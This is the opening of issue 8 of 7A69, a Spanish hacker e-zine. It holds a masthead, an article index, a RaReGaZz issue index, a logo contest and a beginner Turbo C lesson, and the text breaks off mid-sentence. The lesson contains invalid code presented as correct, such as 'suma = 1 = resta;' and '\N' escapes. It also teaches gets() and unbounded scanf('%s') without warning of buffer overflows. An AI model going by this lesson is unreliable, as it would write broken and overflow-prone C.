
                                ÉÍÍÍÍÍÍÍÍÍÍÍÍ»
           ---------------------º  12-03-00  º-------------------
                                ÈÍÍÍÍÍÍÍÍÍÍÍÍ¼
           ------------------------------------------------------
           ²²²²²²²²²²²°      ²²²²°            ²²²°        ²²²²°     
                    ²²°     ²²° ²²°         ²²°         ²²°   ²²°
                   ²²°     ²²°   ²²°       ²²°         ²²°    ²²°
                  ²²°      ²²°   ²²°       ²²²²²°       ²²°   ²²°
                 ²²°      ²²²²²²²²²²°     ²²°   ²²°       ²²²²²°            
                ²²°       ²²°     ²²°     ²²°    ²²°         ²²°
               ²²°       ²²°       ²²°    ²²°   ²²°         ²²°
              ²²°        ²²°       ²²°     ²²²²²°        ²²²°               
           ------------------------------------------------------
                           E-ZINE PARA GENTE LIBRE    
           ------------------------------------------------------
           [ Num 8  - A¤o I ]                    [ editor: Ripe ]





                     -Distribuidores oficiales de 7A69-

             http://www.geocities.com/fashionavenue/Stage/1500

                       http://www.7a69ezine.8m.com





                               -E-Mail oficial-

                            7a69ezine@mixmail.com





                       -Colaboradores en este numero-

                         AiNaKeR (ainaker@mixmail.com)

                                DAn_^^ (?@?)

                          IReick (ireick@hotmail.com)

                          Doing (jdoing@bigfoot.com)

                            Ripe (ripe@mixmail.com)

                                Trycky (?@?)     





                              -Recomendaciones-

       Usar el EDIT de MS-DOS o el JED de linux para leer este E-Zine





           ------------------------------------------------------



                    "No tengas miedo de ir despacio..."

                    "tan solo tenlo de quedarte parado"


      
      
#############################################################################
# NOTA: Ninguno de los colaboradores en este e-zine se responsabiliza del   #
#       mal use que el lector pueda hacer de la informacion que aqui se     #
#       presenta, ya que esta esta expuesta con fines unicamente            #
#       informativos. Asi que ya sabes TODO LO QUE HAGAS ES RESPONSABILIDAD #
#       TUYA, NO NUESTRA.                                                   #
#############################################################################





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *        º     * TEMA *    º  * NIVEL *  º  * AUTOR *  º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º1.- Presentacion             º                 º             º   Editor    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º2.- Indice RaReGaZz [1-7]    º                 º             º   Editor    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º3.- Dise¤o grafico por       º    Concurso     º             º   Editor    º
º    ordenador                º                 º             º             º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º4.- Curso de C y C++ II      º  Programacion   º    Bajo     º   IReick    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º5.- Curso de UNIX IV         º     Hacking     º    Bajo     º    Ripe     º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º6.- Shells, ¨Que co¤o es eso?º     Hacking     º    Bajo     º    DAn_^^   º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º7.- Charlando con            º    Entrevista   º             º    Ripe     º
º    - J.J.F. / Hackers Team -º                 º             º             º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º8.- Entra¤as de Internet;    º     Hacking     º    Alto     º    Ripe     º
º    Protocolos y demas       º                 º             º             º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º9.- Seguridad en Linux       º    Seguridad    º    Medio    º    Trcyky   º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º10.- Sockets                 º  Programacion   ºAlto/Muy altoº   Doing     º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º11.- Proyectos               º    El futuro    º             º   Editor    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º12.- Noticias / Curiosidades º   Actualidad    º             º    Ripe     º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º13.- La voz del lector       º     Mailing     º             º   Editor    º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄº
º14.- Despedida               º  Un numero mas  º             º   Editor    º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍ¼






ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º1.- Presentacion              º                    º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Hola lector!! :->

Ya estamos aqui de nuevo (y ya es la octava vez :P), tratando de exponer
informacion util para todos aquellos que esteis intresados en el mundo
Undergr0und.

¨Que decir? Je je, que la semana que viene cumplimos nuestro primer a¤o. Un
a¤o de publicaciones, y la cosa no ha terminado, de echo va mejor que nunca
(personalmente creo que en este numero hemos dado un importante salto en el
nivel tecnico de la revista :P). Solo una cosa que objetar, NO HEMOS
RECIBIDO CASI MAILS PARA ESTE NUMERO, mandad mails leches, aun que sea un
simple, "hola, buenos dias". Ei, si poneis mas cosas mejor :)

Por cierto.... ¨Que tal las fiestas? ¨Bien? ¨De Turron hasta la medula? (que
chorradas que escribo.....)

Bueno, antes de empezar con este numero quiza que celebremos el primer a¤o
con un buen pastel y una buena fiesta, estais todos invitados, cojed vuestro
torzo, hehehe.



              ²²²²²²² ²²²²²²² ²²²     ²²²²² ²²²²²²²²
              ² ²²²²² ²²²²²²² ²²²      ²²²  ²²²²²²²²
              ² ²     ²²²     ²²²      ²²²      ²²²²
              ² ²²²²  ²²²²²²  ²²²      ²²²    ²²²²²
              ² ²²²²  ²²²²²²  ²²²      ²²²   ²²²²²
              ² ²     ²²²     ²²²      ²²²  ²²²²
              ² ²     ²²²²²²² ²²²²²²²  ²²²  ²²²²²²²²
              ² ²     ²²²²²²² ²²²²²²² ²²²²² ²²²²²²²²----\
               \\                                        \
               //                                         \
               \\                                          \
                \\                                         /
                 \\         1er    ANIVERSARIO            /
                  |--------------------------------------/
                  |                                      \
                  |---------------------------------------\
                





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º2.- Indice RaReGaZz  [1-7]    º                    º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]
             
Para todos aquellos que querais tener un punto de referencia a la hora de
buscar articulos sobre un tema en otros ezines :P

Empezaremos, con el Indice de uno de los E-Zines mas leidos de nuestro pais,
RaReGaZz.

----{ RaReGaZz 1 }-----------------------------------------------------------

1.- Seguridad en su cuenta de Internet - RareTrip
2.- Trucos para mandar correo electronico - KillerBot
3.- Codigos para registrar programas shareware - Dominio Publico
4.- Glosario de terminos usados en esta revista - RareTrip
5.- Acerca de RaReGaZz - RareTrip
6.- L3t2 Hack! - RareTrip
7.- Aplicaciones JavaScript para Home Pages - KillerBot
8.- Seccion de Software - RareTrip
9.- La guia completa de TCP/IP I - ???
10.- La conciencia de una Hacker (tracuccion) - The Mentor
11.- En el proximo numero

-----------------------------------------------------------------------------

----{ RaReGaZz 2 }-----------------------------------------------------------

1.- Guia de Internet - Le PopeItor
2.- Hacking WebSites & HomePages - Le PopeItor
3.- Manual de TCP/IP II - ???
4.- Sistemas de encriptacion - KillerBot
5.- Que es PGP? - KillerBot
6.- Los 10 mejores Websites - RareTrip
7.- Codigos de registro - ???
8.- JavaScript para HomePages - KillerBot
9.- Trucos para UNIX - Shark
10.- Seccion de Software - ???
11.- NotiLoons - ???

-----------------------------------------------------------------------------

----{ RaReGaZz 3 }-----------------------------------------------------------

1.- Como permanecer UNDERGROUND en Internet - KillerBot
2.- Miscelanea sobre los hackers - DuvaHazard
3.- La guia definitiva para Hackear UNIX - Raven Spirit
4.- El Bug de SendMail - Dark Raver
5.- Los Bugs de Internet Explorer - ???
6.- Errores en la seguridad de WINDOWS 95 - ???
7.- Kevin Mitnick, La Leyenda - ???
8.- L3T2 HACK! - RdK
9.- Nuevas tecnologias - Anonimo
10.- CTRL + ALT + DEL - ???
11.- Primer Concurso de RaReGaZz

-----------------------------------------------------------------------------

----{ RaReGaZz 4 }-----------------------------------------------------------

1.- Introduccion - RareTrip
2.- Como convertirse en un Hacker de UNIX - LePompeItor
3.- Vamos de compras por la red (sin gastar un peso) - Mr.X
4.- Como cubrir tus huellas I - CrackSmoker
5.- Poison Java - Mr.X
6.- Algunos Bugs de SendMail - Psycho Tranze
7.- Esteganografia, una vista a fondo - KillerBot
8.- El padre de todos los virus I - internet
9.- ¨Que es un virus? - internet
10.- Los vendedores y el anacoreta - Anonimo
11.- Phreaking para principiantes - Sir Francia Drake
12.- Editorial de Phrack - RaReGaZz
13.- L3T2 HACK! - RdK
14.- CTRL + ALT + DEL - RaReGaZz

-----------------------------------------------------------------------------

----{ RaReGaZz 5 }-----------------------------------------------------------

1.- noiccudortnI - KillerBot
2.- Hackeando demasiado cuando... - LePom
3.- Comandos extra¤os para UNIX - Phrack
4.- Los verdaderos CyberPunks - Phrack
5.- Top Ten's - RaReGaZz
6.- Attack of the killer wareZ - Mr.X
7.- Super kewl smileys - RaReGaZz
8.- Lelles de Murphy - RaReGaZz
9.- Hacking girl's and systems - Phrack
10.- Eres chico adicto a I-net cuando... - Groovy
11.- L3TZ HACK - RdK
12.- Ctrl-Alt-Del - MailBoy & RareTrip
13.- Directorio de BBS - Truco

-----------------------------------------------------------------------------

----{ RaReGaZz 6 }-----------------------------------------------------------

1.- La guerra de los pPlug-Ins - KillerBot
2.- Fallas de seguridad con CGI - Gregory Gilliss
3.- Tempesr, la nueva amenaza - ???
4.- FR3GANDO a 73LM3X I - Truco
5.- Anarquia con elegancia - Mr.X
6.- Los Bugientos de Microsoft - RaReGaZz
7.- El fenomeno virus - Orion
8.- Ingenieria social - Truco
9.- Hackeando BBS's - Phrack
10.-Como cubrir tus huellas II - ???
11.- Que hay de malo con <FONT> - CrackSmoker (traductor)
12.- El padre de todos los virus II - ???
13.- Boomerang! - KillerBoy
14.- NotiLOONS - RaReGaZz

-----------------------------------------------------------------------------

----{ RaReGaZz 7 }-----------------------------------------------------------

1.- Hack,hAck,haCk,hacK - ???
2.- La nueva etica de los hackers - ???
3.- Robando a la telefonica espa¤ola - ???
4.- Tips para el hacker de MS-DOS - YO & Mr.X
5.- Revision WareZ - Siskel & Ebert
6.- Exceso Digital - ???
7.- Guia de HTML para principiantes - ServerHacker
8.- >-COD3Z-< - Anonimo
9.- Informacion de algunos servidores - RaReGaZz 
10.- Cracker de Windows 98 - GuyBrush
11.- B00/\/\3r4NG - MailBoy & RareTrip
12.- NotiLOONS - RaReGaZz

-----------------------------------------------------------------------------

Bueno, hasta aqui por hoy, en el proximo numero de 7A69 podras encontrar el
indice de todos los numeros restantes de RaReGaZz.






ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º3.- Dise¤o grafico por        º     Concurso       º                       º
º    ordenador                 º                    º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Desde la aparicion de los navegadores graficos (como EI, Netscape, Mozilla,
etc), el dise¤o grafico en las paginas web ha ido cobrando cada vez mas
importancia, y aun que si bien es cierto que aqui en espa¤a las redes de
telecomunicaciones son excesivamente lentas (ademos de ello son caras), por
lo que una web con una gran cantidad de imagenes puede hacerse pesada.

                   <Corto por que me voy del tema :P>

En 7A69 hemos pensado que no estaria de mas crear un concurso de dise¤o
de imagenes por ordenador. Para participar no teneis mas que mandar vuestra
creacion al mail oficial de 7A69 (7a69ezine@mixmail.com).

Condiciones de los logos
------------------------
1.- Deben tener un tama¤o inferior a 350x300 y su formato debe ser JPG o GIF
2.- Deben ser promocionales de 7A69 (Que haga referencia a este maravilloso
    ezine :P )
3.- A ser posible fondo blanco, aun que no es rotundamente necesario.
4.- Tambien es posible la creacion de gifs animados.

El ganador
----------
1.- Tendra que conformarse con ser simplemente eso,"El ganador" (Que no suena
    nada mal)
2.- El logo tendra el honor de estar en la pantalla de presentacion de la web
    official de 7a69 :)
3.- Mmmmm, bueno, quiza una camiseta para el ganador, quien sabe?





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º4.- Curso de C y C++ II       º    Programacion    º         Bajo          º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                    [ IReik ]

Bueno, pues segunda entrega del peque¤o curso de C o turbo C, esta vez vamos
a entrar rapido en materia, en esta entrega vamos a ver los puntos 3 y 4 , en
el punto 3 veremos las constantes y variables y en el punto 4 las
instrucciones condicionales, venga pues.




                        CAPITULO 3 - CONSTANTES Y VARIABLES



        3.1 Tipos de datos


Lo primero que hemos de saber es que Turbo C, ya que es el compilador que
utilizamos durante este curso admite cuatro tipos de datos basicos, que son
ENTEROS (36, -9...), REALES(6.2,-1.25E4...), TEXTO (B, CERDO...) y PUNTEROS
(que realmente es la direccion de la posicion de memoria en la que esta
almacenado el dato).

Asi pues, hemos de saber que antes de utilizar una variable hemos de indicar
a de que tipo es.



        3.2 Identificadores


Estos se crean para dar nombres a los diferentes objetos del programa. Turbo
C nos permite utilizar identificadores de un maximo de 32 caracteres y el
primero debe ser una letra o subrayado.



        3.3 Declaraciones


Las utilizamos, como podeis deducir para declarar declarar la variable, esto
es, para indicarle a Turbo C el nombre de la variable y el tipo de dato.
Las declaraciones han de estar en el principio del cuerpo principal (justo
detras de la funcion MAIN() ).

Para escribir declaraciones utilizamos el siguiente formato:

        tipo    identificador, identificador...;

Para indicar el tipo utilizamos las palabras INT (para los enteros), FLOAT
(para los reales), y CHAR para los caracteres.
Despues podemos encontrar, por ejemplo, que para los datos de tipo entero
tambien podemos utilizar la palabra reservada SHORT para hacer que los datos
ocupen menos sitio en memoria, pero como este pretende ser un curso de
iniciacion nos quedaremos con  INT, FLOAT Y CHAR, ya que los demas no los
utiliaremos, veamos un ejemplo de su formato:
                
        int     dia,mes;
        float   estatura;
        char    letra;

Aqui nos encontramos con el problema de que Turbo C no posee un tipo
especifico para las cadenas de caracteres. Hay, no obstantes dos formas de de
definir una variable como cadena. En esta entrega veremos la declaracion de
la variable como array (esto tambien lo veremos con mas profundidad mas
adelante).

Para ir empezando diremos que un array es una variable formada por varios
elementos, en cada uno de los cuales puede almacenarse un dato.

Para declara run array simplemente hemos de a¤adir, entre corchetes, el
numero maximo de elementos que podra contener. Un ejemplo seria declarar un
array de caracteres llamado CASA con un maximo de 10 elementos:

        char    casa[10];



        3.4 Scanf


Esta es una funcion de entrada que nos pide uno o varios datos por teclado y
los almacena en las variables.

Su formato es el siguiente:

        scanf("cadena de formato",a1,a2,a3,...);

Dentro de cadena de formato habra que indicar todos los especificadores de
formato que son los mismos que utiliza printf, recordemoslos:

%d numeros enteros
%f numeros reales
%e numeros reales con formato exponencial
%c caracteres
%s palabras

Es evidente que el formato utilizado para cada variable debe corresponder al
tipo dado a esa variable en la declaracion. Por ejemplo si declaramos la
variable:

        char    casa[10];

Para pedir por pantalla un dato para esa variable haremos:

        scanf   ("%s",casa);

Destacaremos que con una SCANF podemos pedir datos para diferentes variables,
por ejemplo:

        scanf("%d %d %d",&dia,&mes&ano);

En este caso en el programa, al ajecutarlo tendriamos que a¤adir los tres
datos en la misma linea y separados por espacios(estos espacios se pueden
substituir por signos).

Veamos un ejemplo de todo esto:

        printf("\NIntroduce tu nombre: ");
        scanf("%s",nombre);
        printf("\N\NAhora pon tu fecha de nacimiento");
        printf("\Ncon formato DIA/MES/A¤O:\N");
        scanf("%d/%d/%d",&dia,&mes,&ano);

Si compilamos estas lineas nos apareceria en pantalla desde ms-dos:

        Introduce tu nombre:€
        (despues de introducirlo)
        Ahora pon tu fecha de nacimiento
        con formato DIA/MES/A¤O:
        €
        (y tecleariamos algo como 9/4/1999)



        3.5 Operaciones


Mediante una sentencia de asignacion podemos realizar operaciones con los
datos que se han almacenado en memoria (variables).

Por ejemplo podemos hacer:

        variable = constante;
        variable = variable;
        variable = expresion;

para almacenar un valor en la variable situada a la izquierda del igual,
casos reales serian:

        suma = 1;
        resta = suma;
        multiplicacion = resta + suma + 2;

en este caso suma valdra 1, resta valdra 1 tambien y multiplicacion vadra 4.

Tambien podemos abreviar haciendo:

        suma = 1 = resta;



        3.6 Gets


Esta es otra funcion de entrada que solo sirve para almacenar datos en
variables de caracteres y por lo tanto no hemos de poner la cadena de formato
especificando el tipo de variable.

Su formato es:

        gets(variable);

Hemos de tener en cuenta que para GETS el espacio en blanco no significa el
fin de linea, que solo se obtiene al pulsar ENTER.


NOTA: Bueno, asi acabamos el punto 3, antes de continuar os podeis
      entreteniendo hacer algun peque¤o programa, que por ejemplo calcule la
      superficie de una esfera o el area de un triangulo despues de preguntar
      por los datos necesarios, asi vais practicando.





                   CAPITULO 4 - INSTRUCCIONES CONDICIONALES



        4.1 clrscr


Esta funcion nos sirve para borrar la pantalla (muy util si ejecutamos un
programa despues de otro en ms-dos, por ejemplo o para dar mayor claridad a
las entradas y salidas de datos). El nombre significa CLeaR SCReen para los
mas curiosos y su formato es:



        clrscr();


Una vez borrada la pantalla el cursos se colocara en la parte superior
izquierda de la pantalla (al ejecutar algun programa en ms-dos).



        4.2 gotoxy


Esta funcion nos permite colocar el cursor en cualquier punto de la pantalla,
para que el dato que se escriba o se pida por pantalla aparezca en dicha
posicion).

Su formato es:

        gotoxy(columna,fila);

Un ejemplo seria:

        gotoxy(10,5);
        printf("Nombre: ");
        gotoxy(10,7);
        printf("Edad: ");

Al ejecutar esto, el cursor se nos colocaria en la decima columna de la
quinta fila y nos representaria el dato nombre para luego irse a la decima
columna de la septima fila y representar EDAD:
Asi pues obtendriamos

                Nombre:
                
                Edad:



        4.3 getch


Funcion de tipo char que nos permitira detectar la pulsacion de una tecla, es
decir, esperara a que se pulse cualquier tecla del teclado y guardara su
contenido en la variable a la que se asigne la funcion. Decir que no se
visualiza la tecla que pulsamos en pantalla.

Su formato es:

        variable = getch();

Con esto conseguimos que la tecla pulsada se almacene en la variable situada
a la izquierda del igual, cuya variable habra sido declarada anteriormente de
tipo char.

Hemos de tener en cuenta que solamente almacenara el valor de la primera
tecla que se pulse.

Ejemplo:

        aprieta = getch();

ahora pulsamos APRIETO

En la variable aprieta solo quedara almacenado el valor A.
Esta funcion nos sera muy util mas adelante, por ejemplo, para seleccionar
una opcion de un menu.



        4.4 If


Esta sentencia nos sirve para ejecutar una instruccion solo cuando se cumpla
una condicion. Su formato es:

        if(expresion)
                sentencia;

Donde la sentencia podra ser es cualquier funcion de turbo c y expresion
acabara siendo un numero entero.

Cuando la expresion sea cierta se ejecutara la sentencia sino el programa no
ejecutara la siguiente sentencia y continuara con la siguiente instruccion.

Para comparar datos (en la expresion) utilizamos los siguientes operadores
relacionales:

== igual que
< menor que
<= menor o igual que
> mayor que
>= mayor o igual que
!= distinto de 

Un primer ejemplo seria:

        if(dato==3)
                printf("Bravo, buen dato");
        printf("continuamos");

En este ejemplo si la variable dato fuese igual a 3, entonces ejecutara la
instruccion printf que nos mostrara en pantalla Bravo, buen dato para luego
continuar mostrandonos el mensaje continuamosl; si no fuese igual a 3 la
variable dato directamente veriamos en pantalla continuamos.

Otro ejemplito con el if para que quede claro:

        num=2;
        if (dato+3 >= 9)
                num=5;
        printf("%d",num);

En este fragmento de programa primero se le asigna a num el valor 2 luego se
entra en el if donde si la variable dato mas 3 diese un resultado mayor o
igual a nueve se le asignaria el valor 5 a num, de lo contrario num seguiria
valiendo 2 y de eso dependera pues que en el siguiente printf veamos en
pantalla 2 o 5.

Por ultimo decir que si queremos poner mas de una sentencia para que se
cumplan cuando el if sea cierto deberemos encerrar las sentencias entre
corchetes, veamoslo:

        if (tecla=='a')
                {
                gotoxy(10,5);
                printf("has pulsado a");
                }
        printf("se acabo el programa");

Esto  hara que cuando la variable letra sea a se nos muestre en la posicion
10,5 el mensaje has pulsado a y si no fuese cierta la expresion directamente
mostraria el mensaje se acabo el programa.


        4.5 if-else

Su formato es el siguiente:

        if(expresion)
                Sentencia1;
        else
                Sentencia2;

En este caso, cuandol a expresion es cierta se ejecuta la sentencia 1 y la
sentencia 2 se pasa, si es al contrario, es decir la expresion es falsa
entonces la que no se ejecuta es la primera sentencia pero si la segunda
sentencia. Despues de haber ejecutado la pertinente sentencia el programa
continua adelante. Un ejemplo seria:

        if(dato<=10)
                printf("BIEN");
        else
                printf("MAL");
        printf("se acabo");

En el ejemplo si la variable dato es menor o igual que diez veriamos en
pantalla el mensaje bien si dato fuese mayor que diez veriamos en la pantalla
el mensaje mal, en ambos casos luego veriamos en pantalla el mensaje se
acabo.

En esta variacion, igualmente cuando queremos que si se cumple o no la
condicion se ejecute mas de una sentencia utilizamos corchetes, esto es:

        if (dato<=10)
                {
                gotoxy(10,5);
                printf("bien");
                total=dato;
                }
        else 
                {
                gotoxy(10,5);
                printf("mal");
                total=0;
                }

En este ejemplo si la variable dato es menor o igual que diez se mostraria en
la posicion 10,5 de la pantalla el mensaje bien y adeas se le daria a la
variable total el valor de la variable dato. En caso de que la variable dato
fuese mayor que 10 nos encontrariamos con el mensaje mal en la pantalla y que
a la variable total se le asignaria el valor 0.



        4.6 if encadenados


Empezemos con un ejemplo:

        if(b==c)
                if(r>3)
                        printf("bien");

En este ejemplo vemos que cuando b es igual a c se da paso a la siguiente
condicion, es decir si b es igual a c i r es mayor que 3 entonces, y solo
entonces, veremos en pantalla el mensaje bien.

Tambien podemos encadenar varios if-else, pero debemos tener en cuenta que
cada else va unido al if inmediatamente anterior. Un ejemplo seria:

        if(b<a)
                printf("b es menor");
        else if (b>a)
                printf("b es mayor");
        else
                printf("a y b son iguales");

En este ejemplo podemos ver como si b es menor que a se mostrar el mensaje b
es menor, en cambio si b es mayor que a se mostrar b es mayor y sino se
mostrar el mensaje a y b son iguales.



        4.7 operadores logicos


Estos son:

! Negacion logica (not)
&& producto logico (and)
|| suma logica (or)

-El operador logico not invierte el resultado de la expresion que le sigue.
Por ejemplo si ponemos:

        if(!(c>5)

se cumplira la condicion NO cuando c sea mayor que 5 sino al contrario cuando
c sea menor que cinco.

-El operador logico and une dos o mas expresiones. Por ejemplo:

        if((a>b) && (c==d))

En este caso se cumplirian las sentencias que seguirian cuando a sea mayor
que b y cuando c sea igual a d, pero se habran de cumplir las dos
condiciones.

-El operador logico or une dos o mas condiciones pero basta con que sea
 cierta una de las condiciones para ejecutar las sentencias. Por ejemplo
 seria:

        if ((a>b) || (c==d))

En este caso para ejecutar sentencias que seguirian bastaria con que a se
cumpliese una de las dos condiciones es decir que a sea mayor que b o c sea
igual a d, pero no se han de cumplir las dos condiciones para que se ejecuten
las sentencias que seguirian.

Bueno pues hasta aqui ha llegado esta entrega, deciros que en la proxima
entrega y para aclarar la teoria, como ya tendremos suficiente chicha
incluire el codigo fuente de algun programa completo para entender mejor toda
la teoria, de mientras y hasta que llegue la proxima entrega podeis ir
haciendo algun programilla con lo que hemos visto. Recordad que para dudas,
